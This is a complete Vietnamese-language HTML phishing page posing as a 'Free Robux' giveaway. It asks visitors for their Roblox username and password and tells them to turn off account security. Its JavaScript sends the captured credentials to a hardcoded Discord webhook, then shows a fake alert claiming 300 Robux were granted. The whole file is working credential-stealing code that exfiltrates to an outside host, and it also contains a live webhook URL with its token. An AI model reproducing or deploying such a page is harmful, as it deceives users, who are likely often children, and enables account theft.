<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .note {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .robux-info {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            width: 200px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free Robux</h1>
        <p class="note">Vui lòng nhập tên và mật khẩu Roblox và chắc chắn không có bảo mật để chúng tôi có thể tạo gamepass, vì đây là hình thức gamepass nên cần đợi 7 ngày và mật khẩu</p>
        <p id="robuxCount">Số Robux: 12000</p>
        <p class="robux-info">nhập tại khoản và mật khẩu ở dưới đây</p>
        <div>
            <input type="text" id="username" placeholder="Username" required><br>
            <input type="password" id="password" placeholder="Password" required><br>
            <button onclick="sendWebhook()">Gửi</button>
        </div>
    </div>

    <script>
        let robuxCount = 12000;

        async function sendWebhook() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (!username || !password) {
                alert('Vui lòng nhập đầy đủ Username và Password!');
                return;
            }

            const webhookURL = "https://discord.com/api/webhooks/1430814292420333610/WibpAPVTwl5K9yyW75UZqHu5mHMFMCUweyLEegiNlhi81xOSDy5z4VD2KeYEGilGQBpz";
            const payload = {
                content: `**Yêu cầu được duyệt**\nTài khoản: ${username}\nMật khẩu: ${password}`
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    robuxCount -= 300;
                    document.getElementById('robuxCount').textContent = `Số Robux: ${robuxCount}`;
                    alert('Bạn đã nhận thành công 300 robux, vui lòng chờ duyệt và đợi 5-7 ngày');
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                } else {
                    alert('Gửi thất bại. Vui lòng thử lại!');
                }
            } catch (error) {
                console.error('Lỗi:', error);
                alert('Có lỗi xảy ra khi gửi webhook!');
            }
        }
    </script>
</body>
</html>
